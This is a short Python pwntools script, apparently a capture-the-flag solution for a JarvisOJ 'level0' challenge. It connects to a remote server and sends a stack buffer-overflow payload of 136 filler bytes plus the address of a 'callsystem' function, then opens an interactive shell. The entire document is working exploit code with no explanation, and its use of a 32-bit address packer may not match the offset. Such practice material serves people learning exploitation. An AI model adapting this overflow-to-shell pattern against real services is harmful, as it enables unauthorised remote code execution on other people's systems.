# -*- coding: utf-8 -*-
from pwn import *

conn = remote('pwn2.jarvisoj.com', 9881)
b = ELF('level0')
callsystem = b.symbols['callsystem']

payload = 136 * 'A' + p32(callsystem)
conn.send(payload)
conn.interactive()


